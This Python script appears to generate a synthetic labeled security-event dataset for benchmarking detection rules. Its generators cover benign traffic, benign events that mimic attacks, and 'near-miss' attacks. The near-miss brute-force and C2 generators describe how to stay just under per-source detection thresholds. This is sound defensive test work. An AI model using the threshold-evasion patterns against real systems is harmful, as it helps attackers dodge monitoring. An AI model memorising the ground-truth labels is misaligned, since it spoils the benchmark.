def _gen_legit_sudo(base_time: datetime, rng: random.Random) -> list:
    """Legitimate sudo usage — normal admin tasks."""
    events = []
    user = rng.choice([u for u in USERS if u != "admin" and not u.startswith("svc_")])
    src = rng.choice(INTERNAL_IPS)

    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "auth",
        "src_ip": src,
        "user": user,
        "action": "escalation",
        "command": rng.choice(["sudo apt update", "sudo systemctl restart nginx", "sudo cat /var/log/syslog"]),
        "event_type": "authentication",
        "message": f"Authorized sudo by {user}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_chatty_service(base_time: datetime, rng: random.Random) -> list:
    """Service that sends many outbound requests to same IP (looks like beaconing)."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    dest = rng.choice(EXTERNAL_IPS)
    count = rng.randint(20, 50)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.uniform(0.5, 3)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": dest,
            "dest_port": 443,
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(500, 5000),
            "bytes_in": rng.randint(1000, 50000),
            "event_type": "network",
            "message": f"API service {src} -> {dest}:443",
            "label": "benign",
            "attack_type": "none"
        })

    return events


# ═══ HARD NEGATIVE benign events (strongly resemble attacks) ══════════════════════
# These are BENIGN but are designed to closely mimic attack signatures.
# They expose blind-spots in rules that rely solely on surface-level thresholds.

def _gen_hard_neg_ci_auth(base_time: datetime, rng: random.Random) -> list:
    """CI/CD runner with credential rotation: rapid auth failures from external IP then success.

    Looks exactly like a brute-force burst (external IP, 6-10 failures in < 10 min)
    but every attempt is from a known service account during a deploy pipeline.
    """
    events = []
    ci_ip = rng.choice(EXTERNAL_IPS)  # GitHub Actions / GitLab runner IP
    svc_account = "svc_deploy"
    fail_count = rng.randint(6, 10)  # Intentionally above RAPID_THRESHOLD to stress-test

    for i in range(fail_count):
        events.append({
            "timestamp": _ts(base_time, i * 0.3),
            "sourcetype": "auth",
            "src_ip": ci_ip,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": svc_account,
            "action": "failure",
            "event_type": "authentication",
            "message": f"CI auth failure (key rotation in progress): {svc_account}",
            "label": "benign",
            "attack_type": "none",
        })

    events.append({
        "timestamp": _ts(base_time, fail_count * 0.3 + 0.5),
        "sourcetype": "auth",
        "src_ip": ci_ip,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "user": svc_account,
        "action": "success",
        "event_type": "authentication",
        "message": f"CI auth success: {svc_account} after key rotation",
        "label": "benign",
        "attack_type": "none",
    })

    return events


def _gen_hard_neg_analytics_dns(base_time: datetime, rng: random.Random) -> list:
    """Analytics SDK using unique per-session subdomains — resembles DNS exfiltration.

    High-entropy hex session IDs sent to an analytics vendor not in the benign-domain
    allowlist. Hits length, entropy, uniqueness, and volume thresholds simultaneously.
    """
    events = []
    src = rng.choice(INTERNAL_IPS)
    # Analytics vendors intentionally NOT in BENIGN_DNS_BASE_DOMAINS
    vendor = rng.choice(["segment.io", "heapanalytics.com", "mixpanel.com", "datadoghq.com"])
    count = rng.randint(10, 20)

    for i in range(count):
        hex_id = "".join(rng.choices("0123456789abcdef", k=rng.randint(32, 48)))
        query = f"{hex_id}.{vendor}"
        events.append({
            "timestamp": _ts(base_time, i * 1.5),
            "sourcetype": "dns",
            "src_ip": src,
            "dest_ip": "8.8.8.8",
            "query": query,
            "query_length": len(query),
            "query_type": rng.choice(["A", "CNAME"]),
            "event_type": "dns",
            "message": f"Analytics tracking: {query[:60]}",
            "label": "benign",
            "attack_type": "none",
        })

    return events


def _gen_hard_neg_monitoring_beacon(base_time: datetime, rng: random.Random) -> list:
    """Monitoring agent with strict 60-second heartbeats — resembles C2 beaconing.

    Extremely regular timing, small payloads, always port 443 to same dest IP.
    Satisfies every C2 heuristic but is a legitimate observability agent.
    """
    events = []
    src = rng.choice(INTERNAL_IPS)
    dest = rng.choice(EXTERNAL_IPS)
    count = rng.randint(20, 40)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * 1.0),  # Exactly 60-second intervals
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": dest,
            "dest_port": 443,
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(80, 220),
            "bytes_in": rng.randint(30, 100),
            "event_type": "network",
            "message": f"Monitoring heartbeat {src} -> {dest}:443",
            "label": "benign",
            "attack_type": "none",
        })

    return events


def _gen_hard_neg_backup_smb(base_time: datetime, rng: random.Random) -> list:
    """Backup agent probing many hosts for changed-file metadata — resembles lateral movement.

    Sequential, rapid SMB connections to many internal hosts within the detection
    window. Intentionally keeps bytes_out low (metadata only) to hit the transfer
    guard in the lateral-movement rule.
    """
    events = []
    backup_server = INTERNAL_IPS[0]
    targets = rng.sample(INTERNAL_IPS[1:], k=rng.randint(5, 9))

    for i, target in enumerate(targets):
        events.append({
            "timestamp": _ts(base_time, i * 2.0),  # Fast enough to fit in 20-min window
            "sourcetype": "firewall",
            "src_ip": backup_server,
            "dest_ip": target,
            "dest_port": 445,
            "action": "allowed",
            "direction": "internal",
            "bytes_out": rng.randint(200, 5000),  # Metadata probe, not full transfer
            "event_type": "network",
            "message": f"Backup metadata scan {backup_server} -> {target}:445",
            "label": "benign",
            "attack_type": "none",
        })

    return events


def _gen_normal_auth(base_time: datetime, rng: random.Random) -> list:
    """Normal clean authentication events."""
    events = []
    user = rng.choice(USERS)
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 60)),
        "sourcetype": "auth",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(INTERNAL_IPS),
        "user": user,
        "action": "success",
        "event_type": "authentication",
        "message": f"Login event for {user}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_dns(base_time: datetime, rng: random.Random) -> list:
    """Normal DNS events."""
    events = []
    domain = rng.choice(BENIGN_DOMAINS)
    subdomain = rng.choice(["www", "api", "cdn", "mail", ""])
    query = f"{subdomain}.{domain}" if subdomain else domain
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 30)),
        "sourcetype": "dns",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(["8.8.8.8", "1.1.1.1", "10.0.1.1"]),
        "query": query,
        "query_length": len(query),
        "query_type": rng.choice(["A", "AAAA", "CNAME"]),
        "event_type": "dns",
        "message": f"DNS query: {query}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_firewall(base_time: datetime, rng: random.Random) -> list:
    """Normal firewall events."""
    events = []
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 30)),
        "sourcetype": "firewall",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(EXTERNAL_IPS),
        "dest_port": rng.choice([80, 443, 8080, 22, 53]),
        "action": "allowed",
        "direction": "outbound",
        "bytes_out": rng.randint(500, 100000),
        "bytes_in": rng.randint(200, 500000),
        "event_type": "network",
        "message": "Outbound web traffic",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_process(base_time: datetime, rng: random.Random) -> list:
    """Normal process creation events."""
    normal_procs = ["chrome.exe", "outlook.exe", "code.exe", "python.exe",
                    "node.exe", "java.exe", "slack.exe", "teams.exe"]

    return [{
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": rng.choice(INTERNAL_IPS),
        "user": rng.choice(USERS),
        "process": rng.choice(normal_procs),
        "command_line": "",
        "parent_process": "explorer.exe",
        "event_type": "process",
        "message": "Normal process creation",
        "label": "benign",
        "attack_type": "none"
    }]


def _gen_normal_http(base_time: datetime, rng: random.Random) -> list:
    """Normal HTTP web requests."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    endpoints = ["/home", "/about", "/products", "/contact", "/api/status", "/login"]
    methods = ["GET", "POST"]
    
    endpoint = rng.choice(endpoints)
    method = rng.choice(methods)
    
    # Benign parameters
    if method == "GET":
        if endpoint == "/products":
            url = f"http://app.internal{endpoint}?category={rng.choice(['electronics', 'books', 'clothing'])}&page={rng.randint(1, 10)}"
            body = ""
        elif endpoint == "/search":
            url = f"http://app.internal{endpoint}?q={rng.choice(['laptop', 'headphones', 'python book'])}"
            body = ""
        else:
            url = f"http://app.internal{endpoint}"
            body = ""
    else:  # POST
        url = f"http://app.internal{endpoint}"
        if endpoint == "/login":
            body = f"username={rng.choice(USERS)}&password=***REDACTED***"
        elif endpoint == "/contact":
            body = f"name=John&email=john@example.com&message=Hello"
        else:
            body = f"data={rng.randint(1000, 9999)}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": url,
        "request": f"{method} {endpoint} HTTP/1.1",
        "body": body,
        "method": method,
        "user_agent": rng.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]),
        "event_type": "http",
        "message": f"HTTP {method} {endpoint}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_api_call(base_time: datetime, rng: random.Random) -> list:
    """Benign API calls that might look like injection attempts but aren't."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # These contain special characters but are benign
    api_calls = [
        {"url": "http://api.internal/search?q=error+in+log", "body": ""},
        {"url": "http://api.internal/query", "body": "sql=SELECT+*+FROM+logs+WHERE+level=debug"},
        {"url": "http://api.internal/log", "body": "message=Process+completed+with+exit+code+0"},
        {"url": "http://api.internal/render?template=<div>{{title}}</div>", "body": ""},
        {"url": "http://api.internal/debug?cmd=echo+hello+world", "body": ""},
    ]
    
    call = rng.choice(api_calls)
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": call["url"],
        "request": f"GET {call['url'].split('/', 3)[-1]} HTTP/1.1" if call["body"] == "" else "POST /query HTTP/1.1",
        "body": call["body"],
        "method": "GET" if call["body"] == "" else "POST",
        "user_agent": "InternalAPI-Client/1.0",
        "event_type": "http",
        "message": f"API call: {call['url'][:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_file_access(base_time: datetime, rng: random.Random) -> list:
    """Benign file access that might look like path traversal."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate file paths with dots
    legit_paths = [
        "assets/../images/logo.png",
        "static/./css/main.css",
        "docs/v1.2/../v2.0/api.md",
        "../../../home/user/project/README.md",
        # Windows-style
        "..\\..\\shared\\documents\\report.pdf",
        "templates\\..\\..\\config.yaml",
        # Encoded dots (legitimate URL encoding)
        "file%2ename.txt",
        "path%2f%2eto%2fresource",
    ]
    
    path = rng.choice(legit_paths)
    endpoint = rng.choice(["/download", "/static", "/resource", "/assets"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}?file={path}",
        "request": f"GET {endpoint}?file={path} HTTP/1.1",
        "body": "",
        "filepath": path,
        "method": "GET",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "event_type": "http",
        "message": f"Benign file access: {path[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_ldap_query(base_time: datetime, rng: random.Random) -> list:
    """Benign LDAP queries that might look like injection."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate LDAP filter patterns
    legit_filters = [
        "(uid=john.doe)",
        "(cn=admin)",
        "(&(objectClass=person)(department=engineering))",
        "(|(mail=john@example.com)(mail=jdoe@example.com))",
        "(sn=Smith*)",
        "(&(uid=user1)(objectClass=inetOrgPerson))",
    ]
    
    filter_str = rng.choice(legit_filters)
    endpoint = rng.choice(["/ldap/search", "/api/directory"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}?filter={filter_str}",
        "request": f"GET {endpoint}?filter={filter_str} HTTP/1.1",
        "body": f"filter={filter_str}",
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"LDAP query: {filter_str[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_command_exec(base_time: datetime, rng: random.Random) -> list:
    """Benign command execution patterns."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate pipe/command usage
    legit_commands = [
        "sort | uniq",
        "grep pattern | wc -l",
        "echo hello && echo world",
        "cat file | head -n 10",
        "date; uptime",
    ]
    
    cmd = rng.choice(legit_commands)
    endpoint = rng.choice(["/api/tool", "/debug/status"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}?cmd={cmd}",
        "request": f"GET {endpoint}?cmd={cmd} HTTP/1.1",
        "body": "",
        "command": cmd,
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"Benign command: {cmd[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_xml_content(base_time: datetime, rng: random.Random) -> list:
    """Benign XML content with entities."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate XML with internal entities
    legit_xml = [
        "<?xml version=\"1.0\"?><!DOCTYPE note [<!ENTITY writer \"Writer: Donald Duck\">]><note><to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Don't forget me this weekend</body>&writer;</note>",
        "<?xml version=\"1.0\"?><config><database>localhost</database><port>5432</port></config>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><name>John</name><email>john@example.com</email></user>",
    ]
    
    xml = rng.choice(legit_xml)
    endpoint = rng.choice(["/api/xml", "/upload/config"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"POST {endpoint} HTTP/1.1",
        "body": xml,
        "method": "POST",
        "content_type": "application/xml",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"XML content: {xml[:50]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_url_fetch(base_time: datetime, rng: random.Random) -> list:
    """Benign URL fetching that might look like SSRF."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate external URLs
    legit_urls = [
        "https://api.github.com/users/octocat",
        "https://api.twitter.com/1.1/statuses/user_timeline.json",
        "https://hooks.slack.com/services/T000/B000/XXXX",
        "https://api.stripe.com/v1/customers",
    ]
    
    url = rng.choice(legit_urls)
    endpoint = rng.choice(["/api/webhook", "/proxy/fetch"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}?url={url}",
        "request": f"GET {endpoint}?url={url} HTTP/1.1",
        "body": "",
        "ssrf_target": url,
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"URL fetch: {url[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_json_query(base_time: datetime, rng: random.Random) -> list:
    """Benign JSON queries that might look like NoSQL injection."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Legitimate JSON queries
    legit_json = [
        '{"username": "john.doe", "active": true}',
        '{"department": "engineering", "role": "senior"}',
        '{"created": {"$gte": "2024-01-01", "$lte": "2024-12-31"}}',
        '{"tags": {"$in": ["urgent", "critical"]}}',
        '{"status": "active", "verified": true}',
    ]
    
    json_str = rng.choice(legit_json)
    endpoint = rng.choice(["/api/query", "/search"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"POST {endpoint} HTTP/1.1",
        "body": json_str,
        "method": "POST",
        "content_type": "application/json",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"JSON query: {json_str[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_benign_headers(base_time: datetime, rng: random.Random) -> list:
    """Benign requests with various headers."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    
    # Normal header values that might contain special chars
    header_values = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "application/json, text/plain, */*",
        "en-US,en;q=0.9,fr;q=0.8",
        "gzip, deflate, br",
        "session=abc123; user=john; prefs=dark_mode",
    ]
    
    ua = rng.choice(header_values)
    endpoint = rng.choice(["/", "/api/headers", "/webhook"])
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"GET {endpoint} HTTP/1.1",
        "body": "",
        "headers": {"User-Agent": ua, "Accept": "application/json"},
        "user_agent": ua,
        "method": "GET",
        "event_type": "http",
        "message": f"Request with headers: {ua[:40]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


# ═══ Dataset Generation ══════════════════════════════════════════════════════

# ═══ NEAR-MISS malicious variants (evade current threshold defaults) ══════════════
# These ARE malicious but each individual source/connection falls just under
# the default per-actor threshold. They measure rule sophistication gaps.

def _gen_near_miss_distributed_brute(base_time: datetime, rng: random.Random) -> list:
    """Distributed brute force: same target user, different proxy source IPs.

    Each IP contributes fewer failures than RAPID_THRESHOLD (default=6) so the
    per-actor bucket never fires, but cumulatively many failures are made.
    Detection requires correlating across source IPs by target user.
    """
    events = []
    target_user = rng.choice(USERS)
    attacker_ips = rng.sample(EXTERNAL_IPS, k=rng.randint(3, 6))

    for attacker_ip in attacker_ips:
        failures_per_ip = rng.randint(3, 5)  # Always below RAPID_THRESHOLD=6
        for j in range(failures_per_ip):
            events.append({
                "timestamp": _ts(base_time, j * 1.5),
                "sourcetype": "auth",
                "src_ip": attacker_ip,
                "dest_ip": rng.choice(INTERNAL_IPS),
                "user": target_user,
                "action": "failure",
                "event_type": "authentication",
                "message": f"Failed login for {target_user} from {attacker_ip}",
                "label": "malicious",
                "attack_type": "distributed_brute_force",
                "mitre": "T1110.004",
            })

    return events


def _gen_near_miss_fragmented_c2(base_time: datetime, rng: random.Random) -> list:
    """Fragmented C2: traffic spread across multiple destination IPs.

    Each dest IP receives fewer connections than MIN_CONNECTIONS (default=5) so the
    per-pair group never reaches the beaconing threshold. Detection requires
    correlating across destinations by source IP pattern and timing regularity.
    """
    events = []
    src = rng.choice(INTERNAL_IPS)
    c2_ips = rng.sample(EXTERNAL_IPS, k=rng.randint(4, 7))

    for i, c2_ip in enumerate(c2_ips):
        conn_count = rng.randint(3, 4)  # Always below MIN_CONNECTIONS=5
        for j in range(conn_count):
            events.append({
                "timestamp": _ts(base_time, i * 20 + j * 4),
                "sourcetype": "firewall",
                "src_ip": src,
                "dest_ip": c2_ip,
                "dest_port": 443,
                "action": "allowed",
                "direction": "outbound",
                "bytes_out": rng.randint(100, 350),
                "bytes_in": rng.randint(50, 130),
                "event_type": "network",
                "message": f"Fragmented C2 {src} -> {c2_ip}:443",
                "label": "malicious",
                "attack_type": "fragmented_c2",
                "mitre": "T1071",
            })

    return events


# Standard attacks (catchable with good rules)
ATTACK_GENERATORS = {
    "brute_force":          (_gen_brute_force, 12),
    "dns_exfiltration":     (_gen_dns_exfiltration, 8),
    "c2_beaconing":         (_gen_c2_beaconing, 6),
    "lateral_movement":     (_gen_lateral_movement, 10),
    "powershell_abuse":     (_gen_powershell_abuse, 18),
    "privilege_escalation": (_gen_privilege_escalation, 12),
    "sql_injection":        (_gen_sql_injection, 15),
    "rce":                  (_gen_rce_attack, 12),
    "xss":                  (_gen_xss_attack, 10),
    "path_traversal":       (_gen_path_traversal, 10),
    "ldap_injection":       (_gen_ldap_injection, 10),
    "command_injection":    (_gen_command_injection, 10),
    "xxe":                  (_gen_xxe_attack, 8),
    "ssrf":                 (_gen_ssrf_attack, 10),
    "nosql_injection":      (_gen_nosql_injection, 10),
    "log4j":                (_gen_log4j_attack, 10),
}

# Stealthy attacks (harder to detect — distinguishes good from great detection)
STEALTHY_GENERATORS = {
    "slow_brute_force":          (_gen_slow_brute_force, 20),
    "stealthy_c2":               (_gen_stealthy_c2, 10),
    "encoded_exfil":             (_gen_encoded_exfil, 8),
    "fileless_attack":           (_gen_fileless_attack, 15),
    # Near-miss variants: evade current threshold defaults
    "distributed_brute_force":   (_gen_near_miss_distributed_brute, 12),
    "fragmented_c2":             (_gen_near_miss_fragmented_c2, 8),
}

# Benign events (including noisy ones that cause false positives)
BENIGN_GENERATORS = [
    (_gen_normal_auth, 60),
    (_gen_normal_dns, 80),
    (_gen_normal_firewall, 60),
    (_gen_normal_process, 50),
    (_gen_normal_http, 100),        # Normal web traffic
    (_gen_benign_api_call, 30),     # API calls that look like attacks but aren't
    (_gen_benign_file_access, 20),  # File access that looks like traversal
    (_gen_benign_ldap_query, 15),   # LDAP queries that look like injection
    (_gen_benign_command_exec, 15), # Command patterns that look like injection
    (_gen_benign_xml_content, 15),  # XML with entities that look like XXE
    (_gen_benign_url_fetch, 15),    # URL fetching that looks like SSRF
    (_gen_benign_json_query, 15),   # JSON that looks like NoSQL injection
    (_gen_benign_headers, 15),      # Headers that look like Log4j
]

# Noisy benign (designed to trigger false positives in naive rules)
NOISY_BENIGN_GENERATORS = [
    (_gen_noisy_auth, 25),               # password typos look like brute force
    (_gen_long_dns_benign, 30),          # CDN domains look like DNS exfil
    (_gen_admin_smb, 8),                 # admin SMB looks like lateral movement
    (_gen_legit_powershell, 20),         # legit PS looks like abuse
    (_gen_legit_sudo, 15),               # legit sudo looks like privesc
    (_gen_chatty_service, 6),            # API services look like beaconing
    # Hard negatives: benign events that closely mimic attack signatures
    (_gen_hard_neg_ci_auth, 8),          # CI/CD auth burst resembles brute force
    (_gen_hard_neg_analytics_dns, 10),   # analytics tracking resembles DNS exfil
    (_gen_hard_neg_monitoring_beacon, 6), # monitoring heartbeat resembles C2
    (_gen_hard_neg_backup_smb, 6),       # backup scan resembles lateral movement
]


def generate_dataset() -> list:
    """Generate the full labeled dataset."""
    rng = random.Random(SEED)  # nosec B311
    base_time = datetime(2026, 3, 1, 0, 0, 0)
    all_events = []

    # Generate standard attack events
    for attack_name, (gen_fn, count) in ATTACK_GENERATORS.items():
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate stealthy attack events
    for attack_name, (gen_fn, count) in STEALTHY_GENERATORS.items():
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate clean benign events
    for gen_fn, count in BENIGN_GENERATORS:
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate noisy benign events (false positive bait)
    for gen_fn, count in NOISY_BENIGN_GENERATORS:
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Shuffle to simulate real-world ordering
    rng.shuffle(all_events)

    # Assign unique event IDs
    for i, event in enumerate(all_events):
        event["event_id"] = f"EVT-{i+1:05d}"

    return all_events


def strip_labels(events: list) -> list:
    """Remove labels for the agent-facing dataset."""
    unlabeled = []
    for event in events:
        clean = {k: v for k, v in event.items() if k not in ("label", "attack_type", "mitre")}
        unlabeled.append(clean)
    return unlabeled


def print_stats(events: list):
    """Print dataset statistics."""
    total = len(events)
    malicious = [e for e in events if e["label"] == "malicious"]
    benign = [e for e in events if e["label"] == "benign"]

    print(f"\n{'═' * 60}")
    print(f"  SecOps Autoresearch — Dataset Statistics")
    print(f"{'═' * 60}")
    print(f"  Total events:     {total}")
    print(f"  Malicious events: {len(malicious)} ({100*len(malicious)/total:.1f}%)")
    print(f"  Benign events:    {len(benign)} ({100*len(benign)/total:.1f}%)")
    print()

    # Attack type breakdown
    attack_types = {}
    for e in malicious:
        at = e.get("attack_type", "unknown")
        attack_types[at] = attack_types.get(at, 0) + 1

    print(f"  Attack breakdown:")
    for at, count in sorted(attack_types.items(), key=lambda x: -x[1]):
        print(f"    {at:25s} {count:5d} events")

    # Event type breakdown
    print(f"\n  Event types:")
    event_types = {}
    for e in events:
        et = e.get("event_type", "unknown")
        event_types[et] = event_types.get(et, 0) + 1
    for et, count in sorted(event_types.items(), key=lambda x: -x[1]):
        print(f"    {et:25s} {count:5d} events")

    print(f"{'═' * 60}\n")


# ═══ Main ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SecOps Autoresearch — Data Preparation")
    parser.add_argument("--stats", action="store_true", help="Show dataset statistics only")
    args = parser.parse_args()

    # Ensure data directory exists
    os.makedirs(DATA_DIR, exist_ok=True)

    # Generate or load events
    if os.path.exists(EVENTS_FILE) and args.stats:
        with open(EVENTS_FILE, "r") as f:
            events = json.load(f)
        print_stats(events)
    else:
        print("Generating synthetic security events...")
        events = generate_dataset()

        # Save labeled (ground truth)
        with open(EVENTS_FILE, "w") as f:
            json.dump(events, f, indent=2)
        print(f"  ✅ Labeled events saved to {EVENTS_FILE}")

        # Save unlabeled (agent-facing)
        unlabeled = strip_labels(events)
        with open(UNLABELED_FILE, "w") as f:
            json.dump(unlabeled, f, indent=2)
        print(f"  ✅ Unlabeled events saved to {UNLABELED_FILE}")

        print_stats(events)
        print("Data preparation complete. Ready for experiments.")
